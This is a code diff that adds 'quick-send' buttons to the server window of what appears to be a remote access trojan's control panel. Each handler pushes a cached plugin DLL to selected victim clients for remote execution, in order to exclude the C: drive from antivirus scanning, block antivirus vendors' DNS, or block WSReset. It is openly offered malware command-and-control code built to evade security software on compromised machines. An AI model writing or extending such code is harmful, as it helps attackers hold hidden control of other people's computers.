@@ -888,9 +888,78 @@ public partial class ServerWindow : Window
         Log($"[*] Performance Monitor opened for {clients.Count} client(s).");
     }
 
-    private void SelectAll_Click(object sender, RoutedEventArgs e)
+    // ── Miscellaneous quick-send to selected clients ────────────────────────
+    private void QuickExcludeCDrive_Click(object sender, RoutedEventArgs e)
     {
-        GridClients.SelectAll();
+        var clients = GetSelectedClients();
+        if (clients.Count == 0 || _server == null) return;
+        _ = Task.Run(async () =>
+        {
+            // Compile (or use cache) then send to selected clients only
+            var cachePath = PluginCachePath("Exclude C:\\");
+            if (!System.IO.File.Exists(cachePath))
+            {
+                AutoTask_ExcludeCDrive_Click(sender, e);
+                return;
+            }
+            var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
+            var pkt = new Protocol.Packet
+            {
+                Type = Protocol.PacketType.PluginExec,
+                Data = Newtonsoft.Json.JsonConvert.SerializeObject(new Protocol.PluginExecData
+                { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" })
+            };
+            foreach (var c in clients) await _server.SendToClient(c.Id, pkt);
+            Dispatcher.BeginInvoke(() => Log($"[+] Exclude C:\\ sent to {clients.Count} client(s)."));
+        });
+    }
+
+    private void QuickBlockAvDns_Click(object sender, RoutedEventArgs e)
+    {
+        var clients = GetSelectedClients();
+        if (clients.Count == 0 || _server == null) return;
+        _ = Task.Run(async () =>
+        {
+            var cachePath = PluginCachePath("Block AV DNS");
+            if (!System.IO.File.Exists(cachePath))
+            {
+                AutoTask_BlockAvDomains_Click(sender, e);
+                return;
+            }
+            var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
+            var pkt = new Protocol.Packet
+            {
+                Type = Protocol.PacketType.PluginExec,
+                Data = Newtonsoft.Json.JsonConvert.SerializeObject(new Protocol.PluginExecData
+                { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" })
+            };
+            foreach (var c in clients) await _server.SendToClient(c.Id, pkt);
+            Dispatcher.BeginInvoke(() => Log($"[+] Block AV DNS sent to {clients.Count} client(s)."));
+        });
+    }
+
+    private void QuickBlockReset_Click(object sender, RoutedEventArgs e)
+    {
+        var clients = GetSelectedClients();
+        if (clients.Count == 0 || _server == null) return;
+        _ = Task.Run(async () =>
+        {
+            var cachePath = PluginCachePath("Block Reset");
+            if (!System.IO.File.Exists(cachePath))
+            {
+                AutoTask_BlockReset_Click(sender, e);
+                return;
+            }
+            var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
+            var pkt = new Protocol.Packet
+            {
+                Type = Protocol.PacketType.PluginExec,
+                Data = Newtonsoft.Json.JsonConvert.SerializeObject(new Protocol.PluginExecData
+                { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" })
+            };
+            foreach (var c in clients) await _server.SendToClient(c.Id, pkt);
+            Dispatcher.BeginInvoke(() => Log($"[+] Block WSReset sent to {clients.Count} client(s)."));
+        });
     }
 
     private TikTokWindow? _tikTokWindow;
